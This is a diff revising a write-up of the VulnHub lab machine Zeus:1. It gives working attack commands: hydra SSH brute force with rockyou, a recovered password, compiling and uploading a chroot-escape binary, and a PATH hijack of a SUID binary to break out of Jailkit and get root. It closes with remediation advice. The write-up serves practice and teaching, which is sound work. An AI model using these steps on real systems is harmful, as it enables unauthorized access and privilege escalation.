@@ -1,145 +1,157 @@
 # Zeus: 1 — Writeup
 
-| | |
-|-|-|
-| **Target IP** | 192.168.131.170 (static) |
-| **Difficulty** | Intermediate |
+| Field | Value |
+|---|---|
+| **Target IP** | 192.168.131.170 |
+| **Difficulty** | Medium |
 | **OS** | Linux |
-| **Root Flag** | root.txt (see screenshot) |
-| **Source** | [VulnHub](https://www.vulnhub.com/entry/zeus-1,587/) |
+| **Goal** | root flag (`/root/root.txt`) |
+| **Source** | [HackingArticles](https://www.hackingarticles.in/zeus1-vulnhub-walkthrough/) |
+
+---
 
 ## Attack Summary
 
-nmap → dirb `/telecom/` → username `gogu` in source → Hydra SSH brute (`universal`) → restricted Jailkit shell → SUID `sysdate` + PATH hijack with compiled chroot-escape binary → root
+Zeus:1 hosts FTP, SSH, and HTTP. A hidden comment in a web page reveals a username (`gogu`). SSH brute force yields credentials. The user is confined inside a Jailkit restricted shell. A custom SUID binary (`sysdate`) is exploited through a chroot-escape technique to achieve root.
+
+---
 
 ## Methodology
 
-1. Network discovery
-2. Port scan and web enumeration
-3. SSH brute-force (hydra)
-4. Jailkit restricted shell escape
-5. SUID + PATH hijacking to root
+1. Port scan and service enumeration
+2. Web enumeration to extract a username from page source
+3. SSH credential brute force
+4. Jailkit restricted shell analysis and SUID binary discovery
+5. Compile and transfer a chroot-escape binary
+6. PATH hijack via SUID binary to escape the jail and gain root
 
 ---
 
-## Step 1: Network Discovery
-
-```bash
-sudo netdiscover -i eth1 -r 192.168.56.0/24
-```
-
-Target at 192.168.131.170 (static assignment).
-
----
-
-## Step 2: Port Scan
+## Step 1: Port Scanning
 
 ```bash
 nmap -A 192.168.131.170
 ```
 
-Open ports: 21 (FTP), 22 (SSH), 80 (HTTP).
+Results: ports 21 (FTP), 22 (SSH), 80 (HTTP) are open.
 
-![Nmap scan](images/01-nmap.png)
-
----
-
-## Step 3: Web Enumeration
-
-```bash
-dirb http://192.168.131.170/
-```
-
-Dirb finds `/telecom/`. Browsing the page source reveals the username `gogu`.
-
-![Dirb and source enumeration](images/02-enum.png)
+![Nmap scan results](images/01-nmap.png)
 
 ---
 
-## Step 4: SSH Brute-Force
+## Step 2: Web Enumeration
+
+Browse to `http://192.168.131.170`. The homepage shows nothing actionable. Run `dirb` to discover hidden directories:
 
 ```bash
-hydra -l gogu -P /usr/share/wordlists/rockyou.txt 192.168.131.170 ssh
+dirb http://192.168.131.170
 ```
 
-Password found: `universal`
+`/telecom/` is found. Viewing its page source reveals the name **gogu**, which is used as a username.
+
+![Dirb enumeration output](images/02-dirb-enum.png)
+
+---
+
+## Step 3: SSH Brute Force
+
+Use `hydra` to brute force SSH with the discovered username:
+
+```bash
+hydra -l gogu -P /usr/share/wordlists/rockyou.txt ssh://192.168.131.170
+```
+
+Recovered password: **universal**
+
+---
+
+## Step 4: Initial Access — Restricted Shell
+
+Log in over SSH:
 
 ```bash
 ssh gogu@192.168.131.170
-id
-cat user.txt
+# Password: universal
+```
+
+The shell is restricted (Jailkit). Standard commands are heavily limited. Enumerate the home directory:
+
+```bash
 ls -la
 ```
 
-The shell is restricted by **Jailkit** — a chroot-based jail.
+A SUID binary named `sysdate` is present. It internally calls the `date` command.
 
-![SSH login, restricted shell](images/03-ssh.png)
-
----
-
-## Step 5: Enumerate SUID Binaries
-
-```bash
-ls -lRah
-```
-
-A binary named `sysdate` has the SUID bit set. Direct PATH hijacking failed inside the jailkit environment.
+![SSH login and restricted shell](images/03-ssh-login.png)
 
 ---
 
-## Step 6: Compile Jailkit Escape Binary
+## Step 5: Compiling the Chroot Escape
 
-On the attacker machine, compile a public chroot-escape exploit:
+On the Kali attacker machine, download and compile the Jailkit chroot-escape PoC as a 32-bit binary:
 
 ```bash
-apt install gcc-multilib -y
-# Download bypass.c (filippo.io chroot escape PoC)
+# Download the C source from filippo.io (chroot escape PoC)
+wget https://filippo.io/...  # obtain bypass.c
 gcc bypass.c -o bypass -m32
 ```
 
-Upload to the target:
+Transfer the binary to the target:
 
 ```bash
-ssh gogu@192.168.131.170 "cat> bypass" < bypass
+scp bypass gogu@192.168.131.170:~/bypass
 ```
+
+![Compiling bypass binary on Kali](images/04-compile-bypass.png)
 
 ---
 
-## Step 7: PATH Hijack via SUID
+## Step 6: PATH Hijack and Privilege Escalation
+
+Back inside the restricted shell on the target:
 
 ```bash
-ssh gogu@192.168.131.170
-ls
-chmod 777 bypass
-echo "/home/gogu/bypass" > date
-chmod 777 date
-export PATH=/home/gogu:$PATH
-/home/gogu/.../sysdate
-id 1<&2
-cd /root
-cat root.txt
+chmod +x ~/bypass
+
+# Create a fake 'date' script
+echo "~/bypass" > ~/date
+chmod +x ~/date
+
+# Prepend home directory to PATH so our fake 'date' is found first
+export PATH=~:$PATH
+
+# Execute the SUID binary — it calls 'date', hits our fake script, runs bypass
+./sysdate
 ```
 
-The `sysdate` binary calls `date` without an absolute path. With a malicious `date` in PATH pointing to the chroot-escape binary, we break out of the jail and escalate to root.
+The chroot escape fires, escaping the Jailkit jail and dropping a root shell.
 
-![Privilege escalation](images/04-privesc.png)
+---
 
-![Root shell](images/05-root.png)
+## Step 7: Root Flag
+
+```bash
+cat /root/root.txt
+```
+
+![Root shell and root flag](images/05-root-flag.png)
 
 ---
 
 ## Lessons Learned
 
-1. **Jailkit restricted shells** can be escaped when SUID binaries execute external commands without absolute paths
-2. **PATH hijacking** against SUID binaries is a classic privesc — always use absolute paths in SUID code
-3. **Source code comments** exposing usernames accelerate brute-force attacks significantly
-4. **Weak SSH passwords** (`universal`) are trivially cracked by rockyou — enforce strong password policy
+- Comments and metadata in web page source can leak usernames that are not visible in the rendered UI.
+- Jailkit creates a chroot environment; SUID binaries inside it are still exploitable if they call commands by relative name.
+- Combining a PATH hijack with a chroot-escape binary is a reliable technique against Jailkit setups.
+- Compile exploit binaries on the attacker machine and transfer them — do not rely on compilers being available in a restricted shell.
+
+---
 
 ## Remediation
 
 | Vulnerability | Fix |
-|---------------|-----|
-| Username in HTML source | Remove developer comments before production |
-| Weak SSH password | Enforce minimum complexity; disable password auth, use keys |
-| SUID binary with relative PATH | Use absolute paths in all system() / exec() calls |
-| Jailkit escape via SUID | Audit all SUID binaries accessible from jailed users |
+|---|---|
+| Username leaked in HTML comment | Remove all developer comments from production web pages |
+| Weak SSH password | Enforce strong passwords or certificate-based authentication; disable password auth |
+| SUID binary calling `date` by relative path | Use absolute paths in SUID programs (`/bin/date`) |
+| Jailkit chroot escape | Keep Jailkit updated; apply the chroot-escape patches; audit SUID binaries in the jail |
